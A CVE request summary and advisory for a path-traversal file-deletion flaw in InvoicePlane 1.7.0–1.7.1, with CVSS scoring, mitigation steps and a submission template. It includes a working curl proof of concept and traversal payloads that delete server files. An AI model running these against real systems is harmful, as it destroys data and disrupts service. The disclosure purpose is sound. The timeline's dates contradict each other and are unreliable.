# CVE Request Summary - InvoicePlane Arbitrary File Deletion Vulnerability

## CVE Request Information

This document provides the necessary information for requesting a CVE (Common Vulnerabilities and Exposures) identifier for the arbitrary file deletion vulnerability in InvoicePlane.

## How to Request a CVE

### Option 1: Request via GitHub Security Advisory (Recommended)

1. Go to the InvoicePlane repository: https://github.com/InvoicePlane/InvoicePlane
2. Navigate to "Security" tab → "Advisories" → "New draft security advisory"
3. Fill in the form using the information below
4. Submit the advisory - GitHub will automatically request a CVE ID

### Option 2: Request via MITRE CVE Request Form

1. Visit: https://cveform.mitre.org/
2. Fill out the CVE Request Form using the details below
3. Submit and wait for CVE ID assignment (typically 1-7 days)

### Option 3: Contact a CNA (CVE Numbering Authority)

For open-source projects, you can contact:
- **GitHub Security Advisory:** https://securitylab.github.com/
- **MITRE:** cve-assign@mitre.org

## CVE Request Details

### Product Information

| Field | Value |
|-------|-------|
| **Product Name** | InvoicePlane |
| **Vendor/Project** | InvoicePlane.com |
| **Product Website** | https://invoiceplane.com |
| **Source Repository** | https://github.com/InvoicePlane/InvoicePlane |
| **Product Type** | Open-source web application |
| **Product Category** | Invoicing and billing software |

### Vulnerability Information

| Field | Value |
|-------|-------|
| **Vulnerability Type** | Arbitrary File Deletion via Path Traversal |
| **CWE ID** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **Affected Versions** | 1.7.0, 1.7.1 |
| **Fixed Version** | 1.7.2 |
| **Vulnerability Severity** | HIGH |
| **CVSS v3.1 Base Score** | 7.1 |
| **CVSS v3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H |
| **Assigned CVE IDs** | CVE-2026-39978, CVE-2026-40298 |

### CVSS v3.1 Score Breakdown

- **Attack Vector (AV):** Network (N) - Can be exploited remotely
- **Attack Complexity (AC):** Low (L) - No special conditions required
- **Privileges Required (PR):** High (H) - Requires administrator privileges
- **User Interaction (UI):** None (N) - No user interaction needed
- **Scope (S):** Unchanged (U) - Vulnerability affects only the vulnerable component
- **Confidentiality Impact (C):** None (N) - No information disclosure
- **Integrity Impact (I):** High (H) - Files can be deleted, affecting data integrity
- **Availability Impact (A):** High (H) - Critical files can be deleted, causing DoS

**Final Score:** 7.1 (HIGH)

### Suggested CVE Description

**Version 1 (Detailed):**
```
InvoicePlane 1.7.0 and 1.7.1 contains an arbitrary file deletion vulnerability in the settings 
management functionality. An authenticated administrator can exploit path traversal sequences in 
logo filename settings to delete arbitrary files on the server. The vulnerability exists in two 
locations: (1) the settings save function accepts arbitrary logo filenames without validation, 
storing malicious paths in the database, and (2) the remove_logo function retrieves these 
filenames and uses them directly for file deletion without path validation or directory 
confinement. An attacker can set a malicious logo filename containing path traversal sequences 
(e.g., ../../config/database.php) via POST to /index.php/settings, then trigger deletion via 
GET to /index.php/settings/remove_logo/{type}. This can lead to deletion of critical 
configuration files, application files, or system files (if permissions allow), resulting in 
application failure, data loss, or denial of service. Fixed in version 1.7.2 through input 
validation using validate_safe_filename(), type parameter validation against an allow-list, 
and comprehensive file access validation with directory confinement using validate_file_access().
```

**Version 2 (Concise):**
```
InvoicePlane 1.7.0 and 1.7.1 allows authenticated administrators to delete arbitrary files on 
the server through path traversal in logo filename settings. An attacker can set a malicious 
logo filename containing path traversal sequences (e.g., ../../config/database.php) via the 
settings page, then trigger deletion through the remove_logo endpoint. This can lead to 
application failure, data loss, or denial of service. Fixed in version 1.7.2 through input 
validation and directory confinement.
```

**Recommended:** Use Version 2 (Concise) for the CVE description

### Vulnerability Discovery and Disclosure Timeline

| Date | Event |
|------|-------|
| Unknown | Vulnerability discovered (researcher to provide date) |
| 2026-07-17 | Fix developed and tested |
| 2026-04-19 | CVE request submitted |
| 2026-07-14 | Fix released in InvoicePlane v1.7.2 |
| 2026-07-14 | Security advisory created and published |
| Assigned | CVE-2026-39978 and CVE-2026-40298 |

### References

**Official Documentation:**
- Security Advisory: https://github.com/InvoicePlane/InvoicePlane/blob/develop/.github/security/SECURITY_ADVISORY_ARBITRARY_FILE_DELETION.md
- Changelog: https://github.com/InvoicePlane/InvoicePlane/blob/develop/.github/CHANGELOG.md
- Security Policy: https://github.com/InvoicePlane/InvoicePlane/blob/develop/SECURITY.md

**Fix Commit:**
- Repository: https://github.com/InvoicePlane/InvoicePlane
- Release: v1.7.2 (2026-07-14)
- Files changed:
  - `application/modules/settings/controllers/Settings.php`
  - `application/helpers/file_security_helper.php`

**Related CWE:**
- CWE-22: https://cwe.mitre.org/data/definitions/22.html

### Attack Details

**Attack Vector:**
1. Attacker authenticates as administrator (compromised credentials, social engineering, etc.)
2. Attacker sends POST request to `/index.php/settings` with malicious logo filename:
   ```
   settings[invoice_logo]=../../config/database.php
   ```
3. Malicious path is stored in database without validation
4. Attacker triggers deletion via GET to `/index.php/settings/remove_logo/invoice`
5. Target file is deleted from the server

**Impact:**
- **Integrity:** HIGH - Arbitrary file deletion affects data integrity
- **Availability:** HIGH - Deletion of critical files causes service disruption
- **Confidentiality:** NONE - No information disclosure

**Required Privileges:**
- Authenticated administrator access required
- No special system privileges needed beyond InvoicePlane admin role

### Proof of Concept

**Note:** This PoC is for verification purposes only and should be used responsibly.

```bash
#!/bin/bash
# PoC for CVE-YYYY-XXXXX - InvoicePlane Arbitrary File Deletion

# Configuration
TARGET="http://vulnerable-invoiceplane.local"
SESSION="ip_session=valid_admin_session"
CSRF="valid_csrf_token"

# Step 1: Set malicious logo path
echo "[*] Setting malicious logo filename..."
curl -s -X POST "${TARGET}/index.php/settings" \
  -H "Cookie: ${SESSION}" \
  -d "_ip_csrf=${CSRF}&settings[invoice_logo]=../../test-file.txt"

# Step 2: Trigger file deletion
echo "[*] Triggering file deletion..."
curl -s -X GET "${TARGET}/index.php/settings/remove_logo/invoice" \
  -H "Cookie: ${SESSION}"

echo "[*] Attack complete. Check if target file was deleted."
```

### Fix Details

**Vulnerability Root Cause:**
- Missing input validation on logo filename settings
- Direct use of database values for file operations
- No path traversal detection or directory confinement

**Fix Implementation:**
1. Added `validate_safe_filename()` check on settings save
2. Added type parameter validation against allow-list
3. Added `validate_file_access()` with 5 security layers:
   - Filename validation (path traversal, null bytes, absolute paths)
   - Basename extraction (removes directory components)
   - Path construction (within allowed directory)
   - File existence verification
   - Directory confinement (realpath validation)

**Security Improvements:**
- Defense-in-depth with 7 security layers
- Comprehensive error logging with secure hashing
- User-friendly error messages
- Special handling for legitimate edge cases (file already deleted)

### Affected Users

**Who is affected:**
- Users running InvoicePlane versions 1.7.0 or 1.7.1
- Installations with administrator accounts (all installations)
- Self-hosted InvoicePlane instances

**Who is NOT affected:**
- Users running InvoicePlane version 1.7.2 or later
- Users running versions prior to 1.7.0 (vulnerability may exist but not confirmed)

**Estimated Impact:**
- All InvoicePlane 1.7.0 and 1.7.1 installations are vulnerable
- Requires administrator access to exploit
- High severity due to potential for complete application failure

### Mitigation and Remediation

**Immediate Actions:**
1. **Upgrade to InvoicePlane v1.7.2 or later**
2. Audit administrator access logs for suspicious activity
3. Review database for suspicious logo filename values
4. Check filesystem for missing critical files
5. Restore from backup if files were deleted

**Workarounds (if immediate upgrade not possible):**
- Restrict administrator access to trusted users only
- Monitor filesystem for unauthorized deletions
- Implement file integrity monitoring (e.g., AIDE, Tripwire)
- Review administrator activity logs regularly

**Long-term Security:**
- Keep InvoicePlane updated to latest version
- Implement principle of least privilege for admin accounts
- Enable audit logging for all administrative actions
- Regular security audits and penetration testing

### Credit and Acknowledgments

**Reported By:**
- [@ali-iltizar](https://github.com/ali-iltizar) and [@iiihaiii](https://github.com/iiihaiii)

**Fixed By:**
- InvoicePlane Core Development Team

**Advisory Prepared By:**
- InvoicePlane Security Team

**Special Thanks:**
- InvoicePlane community for responsible disclosure
- GitHub Security Team for CVE coordination support

### Contact Information

**Security Contact:**
- Email: security@invoiceplane.com
- General Contact: mail@invoiceplane.com

**Reporting Security Vulnerabilities:**
- Please report security vulnerabilities privately via email
- Do not disclose publicly until fix is available
- Follow responsible disclosure guidelines

**Response Time:**
- Initial response: Within 48 hours
- Fix timeline: Depends on severity (critical issues prioritized)
- Public disclosure: After fix is released and users have time to upgrade

### Additional Notes

**For CVE Reviewers:**
- This vulnerability was fixed proactively as part of security hardening
- Fix includes comprehensive validation and defense-in-depth measures
- No known exploitation in the wild at time of disclosure
- Coordinated disclosure with fix already available

**For Users:**
- This is a HIGH severity vulnerability requiring immediate action
- Exploitation requires administrator access (not remotely exploitable by unauthenticated users)
- Upgrade to v1.7.2 is strongly recommended
- No database changes or data migration required for upgrade

**For Researchers:**
- Responsible disclosure is appreciated
- Security improvements benefit the entire InvoicePlane community
- Acknowledgment provided in security advisories and release notes
- CVE credit will be given to original reporter

---

## CVE Request Checklist

Before submitting your CVE request, ensure you have:

- [ ] Product name and vendor identified
- [ ] Affected versions clearly specified
- [ ] Fixed version identified
- [ ] CVE description written (concise, under 4000 characters)
- [ ] CVSS score calculated and verified
- [ ] CWE classification assigned
- [ ] References and links prepared
- [ ] Timeline documented
- [ ] Contact information provided
- [ ] Proof of concept prepared (optional but recommended)
- [ ] Fix details documented

## Submission Template

Use this template when submitting via email or web form:

```
Subject: CVE Request - InvoicePlane Arbitrary File Deletion Vulnerability

Product: InvoicePlane
Vendor: InvoicePlane.com
Affected Versions: 1.7.0, 1.7.1
Fixed Version: 1.7.2

Vulnerability Type: Arbitrary File Deletion via Path Traversal (CWE-22)

CVSS v3.1 Score: 7.1 (HIGH)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H

Description:
InvoicePlane 1.7.0 and 1.7.1 allows authenticated administrators to delete arbitrary 
files on the server through path traversal in logo filename settings. An attacker can 
set a malicious logo filename containing path traversal sequences (e.g., 
../../config/database.php) via the settings page, then trigger deletion through the 
remove_logo endpoint. This can lead to application failure, data loss, or denial of 
service. Fixed in version 1.7.2 through input validation and directory confinement.

References:
- Security Advisory: [URL to be added]
- GitHub Repository: https://github.com/InvoicePlane/InvoicePlane
- CWE-22: https://cwe.mitre.org/data/definitions/22.html

Contact:
- Email: security@invoiceplane.com
```

---

**Document Version:** 1.1  
**Status:** CVE-2026-39978 and CVE-2026-40298 assigned
